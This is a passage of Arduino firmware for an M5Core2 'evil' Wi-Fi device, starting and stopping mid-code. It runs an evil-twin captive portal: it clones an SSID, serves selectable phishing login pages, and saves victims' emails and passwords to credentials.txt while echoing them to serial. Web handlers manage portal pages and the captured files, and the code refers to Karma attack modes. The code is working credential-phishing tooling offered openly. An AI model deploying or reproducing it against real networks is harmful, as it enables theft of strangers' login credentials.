      html += "                    dirSelect.appendChild(option);";
      html += "                }";
      html += "            });";
      html += "        })";
      html += "        .catch(error => console.error('Error:', error));";
      html += "    var form = document.getElementById('uploadForm');";
      html += "    form.onsubmit = function(event) {";
      html += "        event.preventDefault();";
      html += "        var directory = dirSelect.value;";
      html += "        form.action = '/upload?pass=' + encodeURIComponent(passValue) + '&directory=' + encodeURIComponent(directory);";
      html += "        form.submit();";
      html += "    };";
      html += "};";
      html += "</script>";
      html += "<style>";
      html += "body,html{height:100%;margin:0;display:flex;justify-content:center;align-items:center;background-color:#f5f5f5}select {padding: 10px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #ddd; width: 92%; background-color: #fff; color: #333;}.container{width:50%;max-width:400px;min-width:300px;padding:20px;background:#fff;box-shadow:0 4px 8px rgba(0,0,0,.1);border-radius:10px;display:flex;flex-direction:column;align-items:center}form{width:100%}input[type=file],input[type=submit]{width:92%;padding:10px;margin-bottom:10px;border-radius:5px;border:1px solid #ddd}input[type=submit]{background-color:#007bff;color:#fff;cursor:pointer;width:100%}input[type=submit]:hover{background-color:#0056b3}@media (max-width:600px){.container{width:80%;min-width:0}}";
      html += "</style></body></html>";

      server.send(200, "text/html", html);
    } else {
      server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    }
  });



  server.on("/upload", HTTP_POST, []() {
    server.send(200);
  }, handleFileUpload);

  server.on("/delete-sd-file", HTTP_GET, handleFileDelete);

  server.on("/setup-portal", HTTP_GET, []() {
      String password = server.arg("pass");
      if (password != accessWebPassword) {
          server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
          return;
      }
  
      // Lister les fichiers HTML disponibles dans le dossier /sites avec un indice
      String portalOptions = "";
      File root = SD.open("/sites");
      int index = 0;  // Initialiser un indice pour chaque fichier
  
      while (File file = root.openNextFile()) {
          if (!file.isDirectory() && String(file.name()).endsWith(".html")) {
              // Ajouter l'indice comme valeur pour chaque option
              portalOptions += "<option value='" + String(index) + "'>" + file.name() + "</option>";
              index++;
          }
          file.close();
      }
      root.close();
  
      // Génération de la page HTML avec la liste déroulante pour choisir le fichier de portail
      String html = "<html><head><style>";
      html += "body { background-color: #333; color: white; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }";
      html += ".container { display: inline-block; background-color: #444; padding: 30px; border-radius: 8px; box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.3); width: 320px; }";
      html += "input[type='text'], input[type='password'], select, button { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; box-sizing: border-box; font-size: 16px; background-color: #FFF; color: #333; }";
      html += "button, input[type='submit'] { background-color: #008CBA; color: white; cursor: pointer; border-radius: 25px; transition: background-color 0.3s ease; }";
      html += "button:hover, input[type='submit']:hover { background-color: #005F73; }";
      html += "</style></head><body>";
  
      html += "<div class='container'>";
      html += "<form action='/update-portal-settings' method='get'>";
      html += "<input type='hidden' name='pass' value='" + password + "'>";
      html += "<h2 style='color: #FFF;'>Setup Portal</h2>";
      html += "Portal Name: <br><input type='text' name='newSSID' placeholder='Enter new SSID'><br>";
      html += "New Password (leave empty for open network): <br><input type='password' name='newPassword' placeholder='Enter new Password'><br>";
      
      // Ajout de la liste déroulante pour sélectionner le fichier de portail par indice
      html += "Select Portal Page: <br><select name='portalIndex'>";
      html += portalOptions;
      html += "</select><br>";
      
      html += "<input type='submit' value='Save Settings'><br>";
      html += "</form>";
  
      html += "<div class='button-group'>";
      html += "<a href='/start-portal?pass=" + password + "'><button type='button'>Start Portal</button></a>";
      html += "<a href='/stop-portal?pass=" + password + "'><button type='button'>Stop Portal</button></a>";
      html += "</div>";
      html += "</div></body></html>";
  
      server.send(200, "text/html", html);
  });
  
  
  
  
  
    
  server.on("/update-portal-settings", HTTP_GET, []() {
      String password = server.arg("pass");
      if (password != accessWebPassword) {
          server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
          return;
      }
  
      String newSSID = server.arg("newSSID");
      String newPassword = server.arg("newPassword");
      int portalIndex = server.arg("portalIndex").toInt();  // Récupérer l'indice du fichier sélectionné
  
      // Logs pour vérifier l'indice reçu
      Serial.println("Updating portal settings...");
      Serial.println("New SSID: " + newSSID);
      Serial.println("New Password: " + newPassword);
      Serial.println("Selected Portal Index: " + String(portalIndex));
  
      // Mettre à jour le SSID
      if (!newSSID.isEmpty()) {
          cloneSSIDForCaptivePortal(newSSID);
          Serial.println("Portal Name updated: " + newSSID);
      }
  
      // Mettre à jour le mot de passe
      if (!newPassword.isEmpty()) {
          captivePortalPassword = newPassword;
          Serial.println("Portal Password updated: " + newPassword);
      } else {
          captivePortalPassword = "";  // Réseau ouvert
          Serial.println("Portal is now open (no password).");
      }
  
      // Appeler `changePortal` avec l'indice
      changePortal(portalIndex);
      Serial.println("Portal page updated to index: " + String(portalIndex));
  
      server.send(200, "text/html", "<html><body><p>Settings updated successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
  });




  
  server.on("/start-portal", HTTP_GET, []() {
      String password = server.arg("pass");
      if (password != accessWebPassword) {
          server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
          return;
      }
  
      createCaptivePortal();  // Démarrer le portail
      server.send(200, "text/html", "<html><body><p>Portal started successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
  });
  
  server.on("/stop-portal", HTTP_GET, []() {
      String password = server.arg("pass");
      if (password != accessWebPassword) {
          server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
          return;
      }
  
      stopCaptivePortal();  // Arrêter le portail
      server.send(200, "text/html", "<html><body><p>Portal stopped successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
  });


  server.on("/edit-file", HTTP_GET, []() {
      String editFilePassword = server.arg("pass");
      if (editFilePassword != accessWebPassword) {
          Serial.println("Unauthorized access attempt to /edit-file");
          server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
          return;
      }
  
      String editFileName = server.arg("filename");
      if (!editFileName.startsWith("/")) {
          editFileName = "/" + editFileName;
      }
  
      // Check if the file exists
      if (!SD.exists(editFileName)) {
          Serial.println("File not found: " + editFileName);
          server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
          return;
      }
  
      // Open the file for reading
      File editFile = SD.open(editFileName, FILE_READ);
      if (!editFile) {
          Serial.println("Failed to open file for reading: " + editFileName);
          server.send(500, "text/html", "<html><body><p>Failed to open file for reading.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
          return;
      }
  
      Serial.println("File opened successfully: " + editFileName);
  
      // Send HTML header with UTF-8 encoding
      String htmlContent = "<!DOCTYPE html><html><head><meta charset='UTF-8'><style>";
      htmlContent += "textarea { width: 100%; height: 400px; }";
      htmlContent += "button { background-color: #007bff; border: none; color: white; padding: 10px; font-size: 16px; cursor: pointer; margin-top: 10px; }";
      htmlContent += "</style></head><body>";
      htmlContent += "<h3>Editing File: " + editFileName + "</h3>";
      htmlContent += "<form id='editForm' method='post' enctype='multipart/form-data'>";
      htmlContent += "<input type='hidden' name='filename' value='" + editFileName + "'>";
      htmlContent += "<input type='hidden' name='pass' value='" + editFilePassword + "'>";
      htmlContent += "<textarea id='content' name='content'>";
  
      // Send the initial part of the HTML
      server.sendContent(htmlContent);
  
      // Send the file content in chunks
      const size_t editFileBufferSize = 512;
      uint8_t editFileBuffer[editFileBufferSize];
      while (editFile.available()) {
          size_t bytesRead = editFile.read(editFileBuffer, editFileBufferSize);
          server.sendContent(String((char*)editFileBuffer).substring(0, bytesRead));
      }
      editFile.close();
  
      // Complete the HTML
      htmlContent = "</textarea><br>";
      htmlContent += "<button type='button' onclick='submitForm()'>Save</button>";
      htmlContent += "</form>";
      htmlContent += "<script>";
      htmlContent += "function submitForm() {";
      htmlContent += "  var formData = new FormData();";
      htmlContent += "  formData.append('pass', '" + editFilePassword + "');";
      htmlContent += "  formData.append('filename', '" + editFileName + "');";
      htmlContent += "  var blob = new Blob([document.getElementById('content').value], { type: 'text/plain' });";
      htmlContent += "  formData.append('filedata', blob, '" + editFileName + "');";
      htmlContent += "  var xhr = new XMLHttpRequest();";
      htmlContent += "  xhr.open('POST', '/save-file', true);";
      htmlContent += "  xhr.onload = function () {";
      htmlContent += "    if (xhr.status === 200) {";
      htmlContent += "      alert('File saved successfully!');";
      htmlContent += "      window.history.back();";
      htmlContent += "    } else {";
      htmlContent += "      alert('An error occurred while saving the file.');";
      htmlContent += "    }";
      htmlContent += "  };";
      htmlContent += "  xhr.send(formData);";
      htmlContent += "}";
      htmlContent += "</script>";
      htmlContent += "</body></html>";
  
      // Send the final part of the HTML
      server.sendContent(htmlContent);
  
      // Close the connection
      server.client().stop();
  });
  
  
  
  server.on("/save-file", HTTP_POST, []() {
      // This is called after the file upload is complete
      if (!isSaveFileAuthorized) {
          server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      } else {
          server.send(200, "text/html", "<html><body><p>File saved successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      }
      // Reset authorization flag
      isSaveFileAuthorized = false;
  }, handleSaveFileUpload);
  
  
  server.on("/monitor-status", HTTP_GET, []() {
      String password = server.arg("pass");
      if (password != accessWebPassword) {
          server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
          return;
      }

       // Vérification de la connexion Wi-Fi et mise à jour des variables
      if (WiFi.localIP().toString() != "0.0.0.0") {
          wificonnected = true;
          ipAddress = WiFi.localIP().toString();
      } else {
          wificonnected = false;
          ipAddress = "           ";
      }
      
      // Récupération des informations de monitor
      String ssid = clonedSSID;
      String portalStatus = isCaptivePortalOn ? "On" : "Off";
      String page = selectedPortalFile.substring(7);
      String wifiStatus = wificonnected ? "Y" : "N";
      String ip = ipAddress;
      int numClients = WiFi.softAPgetStationNum();
      int numPasswords = countPasswordsInFile();
      String stackLeft = getStack();
      String ramUsage = getRamUsage();
      String batteryLevel = getBatteryLevel();


      // Génération du HTML pour afficher les informations
      String html = "<!DOCTYPE html><html><head><style>";
      html += "body { font-family: Arial, sans-serif; background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }";
      html += ".container { background-color: #ffffff; padding: 20px 40px; border-radius: 12px; box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15); width: 90%; max-width: 500px; }";
      html += "h2 { color: #007bff; margin-top: 0; font-size: 24px; text-align: center; }";
      html += ".info { display: flex; justify-content: space-between; margin-bottom: 15px; padding: 10px; background-color: #f7f9fc; border-radius: 6px; border: 1px solid #e1e4e8; }";
      html += ".label { font-weight: bold; color: #333; }";
      html += ".value { color: #666; }";
      html += ".footer { text-align: center; margin-top: 20px; font-size: 14px; color: #999; }";
      html += "</style></head><body>";
      html += "<div class='container'>";
      html += "<h2>Monitor Status</h2>";
  
      // Informations de statut en blocs organisés
      html += "<div class='info'><span class='label'>SSID:</span><span class='value'>" + ssid + "</span></div>";
      html += "<div class='info'><span class='label'>Portal Status:</span><span class='value'>" + portalStatus + "</span></div>";
      html += "<div class='info'><span class='label'>Page:</span><span class='value'>" + page + "</span></div>";
      html += "<div class='info'><span class='label'>Connected:</span><span class='value'>" + wifiStatus + "</span></div>";
      html += "<div class='info'><span class='label'>IP Address:</span><span class='value'>" + ip + "</span></div>";
      html += "<div class='info'><span class='label'>Clients Connected:</span><span class='value'>" + String(numClients) + "</span></div>";
      html += "<div class='info'><span class='label'>Passwords Count:</span><span class='value'>" + String(numPasswords) + "</span></div>";
      html += "<div class='info'><span class='label'>Stack Left:</span><span class='value'>" + stackLeft + " KB</span></div>";
      html += "<div class='info'><span class='label'>RAM Usage:</span><span class='value'>" + ramUsage + " MB</span></div>";
      html += "<div class='info'><span class='label'>Battery Level:</span><span class='value'>" + batteryLevel + "%</span></div>";
  
      // Pied de page
      html += "<div class='footer'>Time Up: " + String(millis() / 1000) + " seconds</div>";
      html += "</div>";
      html += "</body></html>";
  
      server.send(200, "text/html", html);
  });

  server.on("/scan-network", HTTP_GET, []() {
      String password = server.arg("pass");
      if (password != accessWebPassword) {
          server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
          return;
      }
          server.send(200, "text/html", "<html><body><p>Scan finnished successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");         
  }); 

    server.on("/favicon.ico", HTTP_GET, []() {
          server.send(404, "text/html", "<html><body><p>Not found.</p></body></html>");
          return;        
  }); 

  server.onNotFound([]() {
    pageAccessFlag = true;
    Serial.println("-------------------");
    Serial.println("Portal Web Access !!!");
    Serial.println("-------------------");
    servePortalFile(selectedPortalFile);
  });

  server.begin();
  Serial.println("-------------------");
  Serial.println("Portal " + ssid + " Deployed with " + selectedPortalFile.substring(7) + " Portal !");
  Serial.println("-------------------");
  if (ledOn) {
    pixels.setPixelColor(4, pixels.Color(255, 0, 0));
    pixels.setPixelColor(5, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(3, pixels.Color(255, 0, 0));
    pixels.setPixelColor(6, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(4, pixels.Color(0, 0, 0));
    pixels.setPixelColor(5, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(2, pixels.Color(255, 0, 0));
    pixels.setPixelColor(7, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(3, pixels.Color(0, 0, 0));
    pixels.setPixelColor(6, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(1, pixels.Color(255, 0, 0));
    pixels.setPixelColor(8, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(2, pixels.Color(0, 0, 0));
    pixels.setPixelColor(7, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(0, pixels.Color(255, 0, 0));
    pixels.setPixelColor(9, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(1, pixels.Color(0, 0, 0));
    pixels.setPixelColor(8, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(0, pixels.Color(0, 0, 0));
    pixels.setPixelColor(9, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);
  }
  if (!isProbeKarmaAttackMode && !isAutoKarmaActive) {
    waitAndReturnToMenu("     Portal\n        " + ssid + "\n        Deployed");
  }
}


void handleSaveFileUpload() {
    HTTPUpload& upload = server.upload();

    if (upload.status == UPLOAD_FILE_START) {
        // Reset authorization flag
        isSaveFileAuthorized = false;

        // Read the password
        String saveFilePassword = server.arg("pass");
        if (saveFilePassword != accessWebPassword) {
            Serial.println("Unauthorized upload attempt.");
            return;
        } else {
            isSaveFileAuthorized = true;
        }

        String saveFileName = server.arg("filename");
        if (!saveFileName.startsWith("/")) {
            saveFileName = "/" + saveFileName;
        }

        // Supprimer l'original s'il existe avant de sauvegarder la nouvelle version
        if (SD.exists(saveFileName)) {
            if (SD.remove(saveFileName)) {
                Serial.println("Original file deleted successfully: " + saveFileName);
            } else {
                Serial.println("Failed to delete original file: " + saveFileName);
                isSaveFileAuthorized = false;
                return;
            }
        }

        // Créer un nouveau fichier pour l'écriture
        saveFileObject = SD.open(saveFileName, FILE_WRITE);
        if (!saveFileObject) {
            Serial.println("Failed to open file for writing: " + saveFileName);
            isSaveFileAuthorized = false;
            return;
        }
    } else if (upload.status == UPLOAD_FILE_WRITE) {
        // Write the received bytes to the file
        if (isSaveFileAuthorized && saveFileObject) {
            saveFileObject.write(upload.buf, upload.currentSize);
        }
    } else if (upload.status == UPLOAD_FILE_END) {
        if (isSaveFileAuthorized && saveFileObject) {
            saveFileObject.close();
            Serial.println("File upload completed successfully.");
        }
    } else if (upload.status == UPLOAD_FILE_ABORTED) {
        if (saveFileObject) {
            saveFileObject.close();
            Serial.println("File upload aborted.");
        }
    }
}



void handleSdCardBrowse() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
        server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
        return;
    }

    String dirPath = server.arg("dir");
    if (dirPath == "") dirPath = "/";

    File dir = SD.open(dirPath);
    if (!dir || !dir.isDirectory()) {
        server.send(404, "text/html", "<html><body><p>Directory not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
        return;
    }

    // Ajout du bouton pour revenir au menu principal
    String html = "<p><a href='/evil-m5core2-menu'><button style='background-color: #007bff; border: none; color: white; padding: 6px 15px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer;'>Menu</button></a></p>";
    
    // Générer le HTML pour lister les fichiers et dossiers
    html += getDirectoryHtml(dir, dirPath, password);
    server.send(200, "text/html", html);
    dir.close();
}

String getDirectoryHtml(File dir, String path, String password) {
    String html = "<!DOCTYPE html><html><head><style>";
    html += "body{font-family:sans-serif;background:#f0f0f0;padding:20px}";
    html += "ul{list-style-type:none;padding:0}";
    html += "li{margin:10px 0;padding:5px;background:white;border:1px solid #ddd;border-radius:5px}";
    html += "a{color:#007bff;text-decoration:none}";
    html += "a:hover{color:#0056b3}";
    html += ".red{color:red}";
    html += "</style></head><body><ul>";

    if (path != "/") {
        String parentPath = path.substring(0, path.lastIndexOf('/'));
        if (parentPath == "") parentPath = "/";
        html += "<li><a href='/check-sd-file?dir=" + parentPath + "&pass=" + password + "'>[Up]</a></li>";
    }

    while (File file = dir.openNextFile()) {
        String fileName = String(file.name());
        String displayFileName = fileName;
        if (path != "/" && fileName.startsWith(path)) {
            displayFileName = fileName.substring(path.length());
            if (displayFileName.startsWith("/")) {
                displayFileName = displayFileName.substring(1);
            }
        }

        String fullPath = path + (path.endsWith("/") ? "" : "/") + displayFileName;
        if (!fullPath.startsWith("/")) {
            fullPath = "/" + fullPath;
        }

        if (file.isDirectory()) {
            html += "<li>Directory: <a href='/check-sd-file?dir=" + fullPath + "&pass=" + password + "'>" + displayFileName + "</a></li>";
        } else {
            html += "<li>File: <a href='/download-sd-file?filename=" + fullPath + "&pass=" + password + "'>" + displayFileName + "</a> (" + String(file.size()) + " bytes)";
            
            // Ajout du lien d'édition pour les fichiers `.txt` et `.html`
            if (fileName.endsWith(".txt") || fileName.endsWith(".html")|| fileName.endsWith(".ini")) {
                html += " <a href='/edit-file?filename=" + fullPath + "&pass=" + password + "' style='color:green;'>[Edit]</a>";
            }

            html += " <a href='#' onclick='confirmDelete(\"" + fullPath + "\")' style='color:red;'>Delete</a></li>";
        }
        file.close();
    }
    html += "</ul>";
    html += "<script>"
            "function confirmDelete(filename) {"
            "  if (confirm('Are you sure you want to delete ' + filename + '?')) {"
            "    window.location.href = '/delete-sd-file?filename=' + filename + '&pass=" + password + "';"
            "  }"
            "}"
            "window.onload = function() {const urlParams = new URLSearchParams(window.location.search);if (urlParams.has('refresh')) {urlParams.delete('refresh');history.pushState(null, '', location.pathname + '?' + urlParams.toString());window.location.reload();}};"
            "</script>";

    return html;
}



void handleFileDownload() {
  String fileName = server.arg("filename");
  if (!fileName.startsWith("/")) {
    fileName = "/" + fileName;
  }
  if (SD.exists(fileName)) {
    File file = SD.open(fileName, FILE_READ);
    if (file) {
      String downloadName = fileName.substring(fileName.lastIndexOf('/') + 1);
      server.sendHeader("Content-Disposition", "attachment; filename=" + downloadName);
      server.streamFile(file, "application/octet-stream");
      file.close();
      return;
    }
  }
  server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
}


void handleDownloadAllFiles() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
    return;
  }

  String dirPath = server.arg("dir");
  if (dirPath == "") dirPath = "/";

  File dir = SD.open(dirPath);
  if (!dir || !dir.isDirectory()) {
    server.send(404, "text/html", "<html><body><p>Directory not found.</p></body></html>");
    return;
  }

  String boundary = "MULTIPART_BYTERANGES";

  // Début de la réponse multipart
  String responseHeaders = "HTTP/1.1 200 OK\r\n";
  responseHeaders += "Content-Type: multipart/x-mixed-replace; boundary=" + boundary + "\r\n";
  responseHeaders += "Connection: close\r\n\r\n";
  server.sendContent(responseHeaders);

  while (File file = dir.openNextFile()) {
    if (!file.isDirectory()) {
      String header = "--" + boundary + "\r\n";
      header += "Content-Type: application/octet-stream\r\n";
      header += "Content-Disposition: attachment; filename=\"" + String(file.name()) + "\"\r\n";
      header += "Content-Length: " + String(file.size()) + "\r\n\r\n";
      server.sendContent(header);

      uint8_t buffer[512];
      while (size_t bytesRead = file.read(buffer, sizeof(buffer))) {
        server.client().write(buffer, bytesRead);
      }
      server.sendContent("\r\n");
    }
    file.close();
  }

  // Fin de la réponse multipart
  String footer = "--" + boundary + "--\r\n";
  server.sendContent(footer);

  dir.close();
}


void handleFileUpload() {
  HTTPUpload& upload = server.upload();
  String password = server.arg("pass");
  const size_t MAX_UPLOAD_SIZE = 8192;

  if (password != accessWebPassword) {
    Serial.println("Unauthorized access attempt");
    server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
    return;
  }

  if (upload.status == UPLOAD_FILE_START) {
    String filename = upload.filename;
    String directory = server.arg("directory");

    if (!directory.startsWith("/")) {
      directory = "/" + directory;
    }

    if (!directory.endsWith("/")) {
      directory += "/";
    }

    String fullPath = directory + filename;

    fsUploadFile = SD.open(fullPath, FILE_WRITE);
    if (!fsUploadFile) {
      Serial.println("Upload start failed: Unable to open file " + fullPath);
      server.send(500, "text/html", "File opening failed");
      return;
    }

    Serial.print("Upload Start: ");
    Serial.println(fullPath);
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (fsUploadFile && upload.currentSize > 0 && upload.currentSize <= MAX_UPLOAD_SIZE) {
      size_t written = fsUploadFile.write(upload.buf, upload.currentSize);
      if (written != upload.currentSize) {
        Serial.println("Write Error: Inconsistent data size.");
        fsUploadFile.close();
        server.send(500, "text/html", "File write error");
        return;
      }
    } else {
      if (!fsUploadFile) {
        Serial.println("Error: File is no longer valid for writing.");
      } else if (upload.currentSize > MAX_UPLOAD_SIZE) {
        Serial.println("Error: Data segment size too large.");
        Serial.println(upload.currentSize);
      } else {
        Serial.println("Information: Empty data segment received.");
      }
      return;
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    if (fsUploadFile) {
      fsUploadFile.close();
      Serial.print("Upload End: ");
      Serial.println(upload.totalSize);
      server.send(200, "text/html", "<html><body><p>File successfully uploaded</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      Serial.println("File successfully uploaded");
    } else {
      server.send(500, "text/html", "File closing error");
      Serial.println("File closing error");
    }
  }
}

void handleListDirectories() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/plain", "Unauthorized");
    return;
  }

  File root = SD.open("/");
  String dirList = "";

  while (File file = root.openNextFile()) {
    if (file.isDirectory()) {
      dirList += String(file.name()) + "\n";
    }
    file.close();
  }
  root.close();
  server.send(200, "text/plain", dirList);
}

void listDirectories(File dir, String path, String & output) {
  while (File file = dir.openNextFile()) {
    if (file.isDirectory()) {
      output += String(file.name()) + "\n";
      listDirectories(file, String(file.name()), output);
    }
    file.close();
  }
}


void handleFileDelete() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    return;
  }

  String fileName = server.arg("filename");
  if (!fileName.startsWith("/")) {
    fileName = "/" + fileName;
  }
  if (SD.exists(fileName)) {
    if (SD.remove(fileName)) {
      server.send(200, "text/html", "<html><body><p>File deleted successfully</p><script>setTimeout(function(){window.location = document.referrer + '&refresh=true';}, 2000);</script></body></html>");
      Serial.println("-------------------");
      Serial.println("File deleted successfully");
      Serial.println("-------------------");
    } else {
      server.send(500, "text/html", "<html><body><p>File could not be deleted</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      Serial.println("-------------------");
      Serial.println("File could not be deleted");
      Serial.println("-------------------");
    }
  } else {
    server.send(404, "text/html", "<html><body><p>File not found</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    Serial.println("-------------------");
    Serial.println("File not found");
    Serial.println("-------------------");
  }
}

void servePortalFile(const String & filename) {

  File webFile = SD.open(filename);
  if (webFile) {
    server.streamFile(webFile, "text/html");
    /*Serial.println("-------------------");
      Serial.println("serve portal.");
      Serial.println("-------------------");*/
    webFile.close();
  } else {
    server.send(404, "text/html", "<html><body><p>File not found</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
  }
}

void saveCredentials(const String& email, const String& password, const String& portalName, const String& clonedSSID) {
  File file = SD.open("/credentials.txt", FILE_APPEND);
  if (file) {
    file.println("-- Email -- \n" + email);
    file.println("-- Password -- \n" + password);
    file.println("-- Portal -- \n" + portalName); // Ajout du nom du portail
    file.println("-- SSID -- \n" + clonedSSID); // Ajout du SSID cloné
    file.println("----------------------");
    file.close();
    Serial.println("-------------------");
    Serial.println(" !!! Credentials " + email + ":" + password + " saved !!! ");
    Serial.println("On Portal Name: " + portalName);
    Serial.println("With Cloned SSID: " + clonedSSID);
    Serial.println("-------------------");
    if (vibration) {
      M5.Power.Axp192.setLDO3(3300);
      delay(300);
      M5.Power.Axp192.setLDO3(0);
    }
  } else {
    Serial.println("Error opening file for writing");
  }
}


void stopCaptivePortal() {
  dnsServer.stop();
  server.stop();
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.softAPdisconnect(true);
  isCaptivePortalOn = false;
  Serial.println("-------------------");
  Serial.println("Portal Stopped");
  Serial.println("-------------------");
  if (ledOn) {
    pixels.setPixelColor(0, pixels.Color(255, 0, 0));
    pixels.setPixelColor(9, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(0, pixels.Color(0, 0, 0));
    pixels.setPixelColor(9, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(1, pixels.Color(255, 0, 0));
    pixels.setPixelColor(8, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(1, pixels.Color(0, 0, 0));
    pixels.setPixelColor(8, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(2, pixels.Color(255, 0, 0));
    pixels.setPixelColor(7, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(2, pixels.Color(0, 0, 0));
    pixels.setPixelColor(7, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(3, pixels.Color(255, 0, 0));
    pixels.setPixelColor(6, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(3, pixels.Color(0, 0, 0));
    pixels.setPixelColor(6, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(4, pixels.Color(255, 0, 0));
    pixels.setPixelColor(5, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(4, pixels.Color(0, 0, 0));
    pixels.setPixelColor(5, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);
  }
  waitAndReturnToMenu("  Portal Stopped");
}

void listPortalFiles() {
  File root = SD.open("/sites");
  numPortalFiles = 0;
  Serial.println("Available portals:");
  while (File file = root.openNextFile()) {
    if (!file.isDirectory()) {
      String fileName = file.name();
      // Ignore mac os file stating with ._
      if (!fileName.startsWith("._") && fileName.endsWith(".html")) {
        portalFiles[numPortalFiles] = String("/sites/") + fileName;

        Serial.print(numPortalFiles);
        Serial.print(": ");
        Serial.println(fileName);

        numPortalFiles++;
        if (numPortalFiles >= 30) break; // max 30 files
      }
    }
    file.close();
  }
  root.close();
}



void serveChangePasswordPage() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
    return;
  }

  String html = "<html><head><style>";
  html += "body { background-color: #333; color: white; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }";
  html += "form { background-color: #444; padding: 20px; border-radius: 8px; display: inline-block; }";
  html += "input[type='password'], input[type='submit'] { width: 80%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }";
  html += "input[type='submit'] { background-color: #008CBA; color: white; cursor: pointer; }";
  html += "input[type='submit']:hover { background-color: #005F73; }";
  html += "</style></head><body>";
  html += "<form action='/Change-Portal-Password-demand' method='get'>";
  html += "<input type='hidden' name='pass' value='" + password + "'>";
  html += "<h2>Change Portal Password</h2>";
  html += "New Password: <br><input type='password' name='newPassword'><br>";
  html += "<input type='submit' value='Change Password'>";
  html += "</form><br>Leave empty for an open AP.<br>Remember to deploy the portal again after changing the password.<br></body></html>";
  server.send(200, "text/html", html);
}



void handleChangePassword() {
  server.on("/Change-Portal-Password-demand", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
      server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
      return;
    }

    String newPassword = server.arg("newPassword");
    captivePortalPassword = newPassword;
